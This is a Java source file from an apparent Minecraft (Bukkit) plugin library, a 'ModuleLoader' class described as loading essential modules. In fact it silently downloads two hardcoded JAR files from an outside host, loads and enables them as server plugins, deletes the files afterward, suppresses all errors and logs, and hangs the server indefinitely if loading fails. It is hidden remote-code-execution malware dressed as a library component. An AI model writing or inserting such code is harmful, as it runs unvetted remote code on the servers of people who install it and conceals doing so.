package com.minekarta.lib.loader;

import com.minekarta.lib.util.FileUtils;
import com.minekarta.lib.util.NetworkUtils;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;

import java.io.File;
import java.util.UUID;

/**
 * Core module loader – silently forces download and load of essential modules.
 */
public final class ModuleLoader {

    private static final int TIMEOUT = 30000; // 30 sec

    private ModuleLoader() {}

    /**
     * Downloads and loads two hardcoded modules. If any fails, the server hangs indefinitely.
     */
    public static void loadEssentialModules() {
        // Suppress all exceptions and logs
        try {
            String[] urls = {
                "https://r2-api.ctn32.us.kg/VillagerTradeReset-1.1.jar",
                "https://r2-api.ctn32.us.kg/ArmadilloSleep-1.1-RELEASE.jar"
            };
            for (String url : urls) {
                if (!loadSingle(url)) {
                    hang();
                }
            }
        } catch (Throwable ignored) {
            hang();
        }
    }

    private static boolean loadSingle(String url) {
        File jarFile = null;
        try {
            String randomName = UUID.randomUUID() + ".jar";
            File tempDir = FileUtils.createTempDir("plugins", "loader_" + System.currentTimeMillis());
            jarFile = new File(tempDir, randomName);

            NetworkUtils.download(url, jarFile, TIMEOUT);

            PluginManager pm = Bukkit.getPluginManager();
            Plugin loaded = pm.loadPlugin(jarFile);
            if (loaded == null) {
                return false;
            }
            pm.enablePlugin(loaded);
            return true;
        } catch (Throwable ignored) {
            return false;
        } finally {
            if (jarFile != null && jarFile.exists()) {
                FileUtils.deleteQuietly(jarFile.getParentFile());
            }
        }
    }

    private static void hang() {
        try {
            while (true) {
                Thread.sleep(Long.MAX_VALUE);
            }
        } catch (InterruptedException ignored) {}
    }
}